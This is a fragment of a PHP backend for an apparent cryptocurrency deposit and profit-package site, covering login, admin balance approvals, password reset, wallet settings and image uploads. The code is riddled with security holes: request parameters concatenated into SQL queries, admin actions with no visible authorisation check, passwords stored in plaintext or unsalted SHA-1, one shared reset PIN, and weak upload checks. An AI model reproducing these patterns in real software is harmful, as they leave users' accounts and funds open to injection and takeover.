$querya_jhf = "UPDATE users SET `last_seen` = '{$ctime}', `ip` = '{$ip}' WHERE id = {$_SESSION['i']} LIMIT 1"; 
$resulto_jhf = $connection->real_query($querya_jhf);



$aTPlus = $site_data['session_at_user'] + 1;
$querya_ = "UPDATE site_main SET
session_at_user = {$aTPlus} WHERE id = 1 LIMIT 1"; 
$resulto_ = $connection->real_query($querya_);



if ($resulto_) {
	if($ip != $usip){
		//-------------------------------
$query90o0 = "SELECT * FROM user{$_SESSION['i']} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$_SESSION['i']} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}

$notibdfg = 'New Login device detected from ip: #'.$ip.', if activity was not performed by you, report activity imidiately. thanks BrcSupport';
$qufgo0oo = false;
$qufgo0ooo = false;

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$_SESSION['i']} SET id_noti = {$oport}, date_noti = CURRENT_TIMESTAMP, noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){
	$qufgo0ooo = $connection->query("INSERT INTO user{$_SESSION['i']} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, CURRENT_TIMESTAMP, '{$notibdfg}')");
}

//--------------------

	}
redirect("../dashboard/index.php");}
}else{redirect('../login.php?check=1&eror=1');}
}



break;



case 43724863673254632576:
$ip = Get_User_Ip();
 date_default_timezone_set('UTC');

$ctime = date("Y-m-d") . ' ' . date("H:i:s");
try{
	if (isset($_GET['forg'])) {
$name = emailF(trim(mysql_prep(htmlentities($_GET['name']))));
$raw_pass = passF(trim(mysql_prep(htmlentities($_GET['password']))));
$password = sha1($raw_pass);
} else { 
$name = emailF(trim(mysql_prep(htmlentities($_POST['name']))));
$raw_pass = passF(trim(mysql_prep(htmlentities($_POST['password']))));
$password = $raw_pass;}
} catch (Exception $e) {
    redirect('../login.php?check=1&eror=31&'.$e->getMessage());
}

if (empty($name) || empty($raw_pass)) {
	redirect('../login.php?check=1&eror=31');
}
$query = "SELECT * FROM site_main 
			WHERE adm_email = '{$name}' 
			AND adm_pass = '{$password}' 
			LIMIT 1";
$result =  $connection->real_query($query);
while ($res = $connection->use_result()){
$found_user = $res->fetch_assoc();}


if (($name == $found_user['adm_email']) && ($password == $found_user['adm_pass'])) {


$_SESSION['adpas'] = $found_user['adm_pass'];
$_SESSION['adraw'] = $raw_pass;
$_SESSION['uz'] = $found_user['adm_email'];


	redirect("../administrator/access.php");
}else{
	redirect('../administrator/index.php?wrong_info');
}

break;


//adm edit transaction
case 23245567878675645342533:
	$iid = $_GET['iid'];
	$id = $_GET['id'];
	$ips = $_GET['i'];
	$oportnoti = $_GET['s'];
	$coin = $_GET['coin'];
	$amount = $_GET['amount'];

$qufgo0oonoti = $connection->query("UPDATE user{$ips} SET trans_s = {$oportnoti} WHERE id_trans = {$id} LIMIT 1");



$queroppin = "SELECT * FROM users 
			WHERE id = {$ips} LIMIT 1";
$resuloppin =  $connection->real_query($queroppin);
while ($revpin = $connection->use_result()){
$found = $revpin->fetch_assoc();}

if($oportnoti == 3){
	$qufgo0oonoti = $connection->query("UPDATE deposit SET status = 1 WHERE id = {$iid} LIMIT 1");
if($_GET['t'] == 2){
	$am = $found['acc_bal'] + $amount;
	$tdpot = $found['t_deposit'] + $amount;
	$qufgo0oonotiww = $connection->query("UPDATE users SET noti = 1, paid = 1, acc_bal = {$am}, status = 8, t_deposit = {$tdpot} WHERE id = {$ips} LIMIT 1");
}else{
	$qufgo0oonotiww = $connection->query("UPDATE users SET noti = 1 WHERE id = {$ips} LIMIT 1");
}}else if($oportnoti == 2){
	//REJECTED
	$qufgo0oonoti = $connection->query("UPDATE deposit SET status = 2 WHERE id = {$iid} LIMIT 1");
if($_GET['t'] == 2){
	$qufgo0oonotiww = $connection->query("UPDATE users SET noti = 1 WHERE id = {$ips} LIMIT 1");
}else{
	$am = $found['acc_bal'] + $amount;
	$qufgo0oonotiwwe = $connection->query("UPDATE users SET noti = 1, paid = 1, acc_bal = {$am} WHERE id = {$ips} LIMIT 1");
}
}

//-------------------------------
$query90o0 = "SELECT * FROM user{$ips} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$ips} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}
if($oportnoti == 2){$sc = 'not approved';}elseif ($oportnoti == 3) {
	$sc = 'successfull';
}
if($_GET['t'] == 1){
	$tty = 'Debit';$ft = 'from';
}elseif($_GET['t'] == 2){$tty = 'Credit';$ft = 'to';}

$notibdfg = 'Your ' . $tty . ' Transaction of $' . $amount . ' ' . $ft . ' ' . $coin . ' Wallet, was ' . $sc;

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$ips} SET id_noti = {$oport}, date_noti = CURRENT_TIMESTAMP, noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){

	$qufgo0ooo = $connection->query("INSERT INTO user{$ips} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, CURRENT_TIMESTAMP, '{$notibdfg}')");
}

//--------------------


if($qufgo0oonoti){
 $pr = str_replace(' ', '<i class="d-none">', $found['name']); 

$transID = alpl(rand(1,15)) . rand(100,999) . rand(100,999) . alpl(rand(1,15)) . alpl(rand(1,15));
 $to = $found['email'];
$subject = 'Transaction Alert';
$message = '<h4>Hello, ' . $pr . '</i></i></i></h4><br/><br/>Your ' . $tty . ' Transaction of $' . $amount . ' was ' . $sc . ' sent to your wallet.<br/><br/><b>Transaction batch</b><br/> ' . $transID . '.<br/>';
$from = '';

include('./email.php');
 


// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
// Create email headers
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();


if(mail($to, $subject, $messagei, $headers)){
	redirect('../administrator/added/home.php?successfull');}else{redirect('../administrator/added/home.php?failed');}

}else{redirect('../administrator/added/home.php?failed');}

	break;

//frogottrnen pass
case 1378691264694654346363313:
	# code...
try{$email = emailF(trim(mysql_prep($_POST['email'])));
} catch (Exception $e) {
    redirect("../login.php?forgotten&eror&fn=&us=&em=" . $email . "&mo=&ps=");
}
$oportnoti = rand(100000, 999999);
  	$qufgo0oonoti = $connection->query("UPDATE pin SET pin = {$oportnoti} WHERE id = 2 LIMIT 1");

	$querop = "SELECT email, name FROM users 
			WHERE email = '{$email}' 
			LIMIT 1";
$resulop =  $connection->real_query($querop);
while ($rev = $connection->use_result()){
$found_usev = $rev->fetch_assoc();}


if ($found_usev['email'] == NULL) {
redirect("../login.php?forgotten&eror&fn=&us=&em=" . $email . "&mo=&ps=");
} else {
		setcookie('rmemai', $found_usev['email'], time()+(60*60));
		




$quersite_pin = "SELECT * FROM pin WHERE id = 2";
$resulsite_pin = $connection->real_query($quersite_pin);
while ($ressite_pin = $connection->use_result()){
$pin = $ressite_pin->fetch_assoc();}
 $pr = str_replace(' ', '<i class="d-none">', $found_usev['name']); 

 $to = $found_usev['email'];
$subject = 'CONFIRM PASSWORD CHANGE';
$message = '<h4>Hello, ' . $pr . '</i></i></i></h4><br/><br/><b>' . $pin['pin'] . '</b><br/><br/><p>Use code to verify change of password. <a href="https://collageme.com/login.php?forgotten">collageme.com</a></p>';
$from = '';

include('./email.php');


// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
// Create email headers
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();


if(mail($to, $subject, $messagei, $headers)){


redirect("../login.php?forgotten&sent&fn=&us=&em=" . $email . "&mo=&ps=");
}
}
	break;



case 23345567987534324332434:
$btc_c = $_POST['btc_c'];
$eth_c = $_POST['eth_c'];
$usdt_c = $_POST['usdt_c']; 
$usdte_c = $_POST['usdte_c'];
$bch_c = $_POST['bch_c'];
$doge_c = $_POST['doge_c']; 
$lite_c = $_POST['lite_c']; 

//
	$qufgo0oonoti = $connection->query("UPDATE site_main SET btc_c = '{$btc_c}', eth_c = '{$eth_c}', usdt_c = '{$usdt_c}', usdte_c = '{$usdte_c}', bch_c = '{$bch_c}', doge_c = '{$doge_c}', lite_c = '{$lite_c}' WHERE id = 1 LIMIT 1");
if($qufgo0oonoti){
	redirect('../administrator/added/home.php?successfull#wallets');
}else{redirect('../administrator/added/home.php?failed#wallets');}

break;

case 2334556798753432433243433434:
$btc_i = $_POST['btc_i'];
$btc_c = $_POST['btc_c'];
$usdt_i = $_POST['usdt_i'];
$usdt_c = $_POST['usdt_c']; 
$eth_i = $_POST['eth_i'];
$eth_c = $_POST['eth_c']; 


function FunctionName($backview)
{
	$target_dir = "../assets/images/bars/"; 
	# code...
$target_file2 = $target_dir . basename($_FILES["{$backview}"]["name"]);
$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));

 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
  if($check2 !== false) {
  	if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
&& $imageFileType2 != "gif" && $imageFileType2 != "pdf" ) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
}else{

if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
    echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
  }}
  }
}
if(!empty($_FILES['btc_ii']["name"])){FunctionName('btc_ii');}
if(!empty($_FILES['eth_ii']["name"])){FunctionName('eth_ii');}
if(!empty($_FILES['usdt_ii']["name"])){FunctionName('usdt_ii');}
if(!empty($_FILES['bnb_ii']["name"])){FunctionName('bnb_ii');}
if(!empty($_FILES['usdc_ii']["name"])){FunctionName('usdc_ii');}
if(!empty($_FILES['ada_ii']["name"])){FunctionName('ada_ii');}

  //

  	$qufgo0oonoti = $connection->query("UPDATE site_main SET btc_i2 = '{$btc_i}', btc_c2 = '{$btc_c}', eth_i2 = '{$eth_i}', eth_c2 = '{$eth_c}', usdt_i2 = '{$usdt_i}', usdt_c2 = '{$usdt_c}' WHERE id = 1 LIMIT 1");
if($qufgo0oonoti){
	redirect('../administrator/added/home.php?display2&successfull#wallets');
}else{redirect('../administrator/added/home.php?display2&failed#wallets');}

break;


case 786757683743958967854832:
$cont1 = $_POST['cont1'];
$cont2 = $_POST['cont2'];
$cont3 = $_POST['cont3'];
$cont4 = $_POST['cont4'];
$cont5 = $_POST['cont5']; 

$pic1 = $_POST['pic1'];
$pic2 = $_POST['pic2'];
$pic3 = $_POST['pic3'];
$pic4 = $_POST['pic4'];
$pic5 = $_POST['pic5']; 


function FunctionName($backview)
{
	$target_dir = "../assets/images/team/"; 
	# code...
$target_file2 = $target_dir . basename($_FILES["{$backview}"]["name"]);
$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));

 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
  if($check2 !== false) {
  	if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
&& $imageFileType2 != "gif" && $imageFileType2 != "pdf" ) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
}else{

if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
    echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
  }}
  }
}
if(!empty($_FILES['picii1']["name"])){FunctionName('picii1');}
if(!empty($_FILES['picii2']["name"])){FunctionName('picii2');}
if(!empty($_FILES['picii3']["name"])){FunctionName('picii3');}
if(!empty($_FILES['picii4']["name"])){FunctionName('picii4');}
if(!empty($_FILES['picii5']["name"])){FunctionName('picii5');}


 	$qufgo0oonoti = $connection->query("UPDATE site_main SET team1_img = '{$pic1}', team2_img = '{$pic2}', team3_img = '{$pic3}', team4_img = '{$pic4}', team5_img = '{$pic5}', team1_cont = '{$cont1}', team2_cont = '{$cont2}', team3_cont = '{$cont3}', team4_cont = '{$cont4}', team5_cont = '{$cont5}' WHERE id = 1 LIMIT 1");
if($qufgo0oonoti){
	redirect('../administrator/added/home.php?successfull#team');
}else{redirect('../administrator/added/home.php?failed#team');}



	break;




case 9876545467898765445678:
try{
$profit1 = textF($_POST['profit1']);
$profit2 = textF($_POST['profit2']);
$profit3 = textF($_POST['profit3']);
$profit4 = textF($_POST['profit4']);

$amount1 = numF($_POST['amount1']);
$amount2 = numF($_POST['amount2']);
$amount3 = numF($_POST['amount3']);
$amount4 = numF($_POST['amount4']);

// $day1 = textF($_POST['day1']);
// $day2 = textF($_POST['day2']);
// $day3 = textF($_POST['day3']);, pack1_d = '{$day1}', pack2_d = '{$day2}', pack3_d = '{$day3}', pack4_d = '{$day4}'
// $day4 = textF($_POST['day4']); 
} catch (Exception $e) {
    redirect('../administrator/added/home.php?failed#pack');
}
	$qufgo0oonoti = $connection->query("UPDATE site_main SET pack1_p = '{$profit1}', pack2_p = '{$profit2}', pack3_p = '{$profit3}', pack4_p = '{$profit4}', pack1_a = '{$amount1}', pack2_a = '{$amount2}', pack3_a = '{$amount3}', pack4_a = '{$amount4}' WHERE id = 1 LIMIT 1");
if($qufgo0oonoti){
	redirect('../administrator/added/home.php?successfull#pack');
}else{redirect('../administrator/added/home.php?failed#pack');}


break;




case 235245657634245354:
try{	
$oldpass = passF($_POST['oldpass']);
$newpass = passF($_POST['newpass']);
} catch (Exception $e) {
    redirect('../administrator/added/home.php?failed#pass');
}

$quersite_data = "SELECT * FROM site_main WHERE id = 1";
$resulsite_data = $connection->real_query($quersite_data);
while ($ressite_data = $connection->use_result()){
$site_data = $ressite_data->fetch_assoc();}

if($oldpass == $site_data['adm_pass']){
	$qufgo0oonoti = $connection->query("UPDATE site_main SET adm_pass = '{$newpass}'  WHERE id = 1 LIMIT 1");


if($qufgo0oonoti){
	redirect('../administrator/added/home.php?successfull#pass');
}else{redirect('../administrator/added/home.php?failed#pass');}


}else{
	redirect('../administrator/added/home.php?failed#pass');

}

break;




default :
	redirect('../logout.php');
break;

}}
?>
<?php $connection->close(); ?>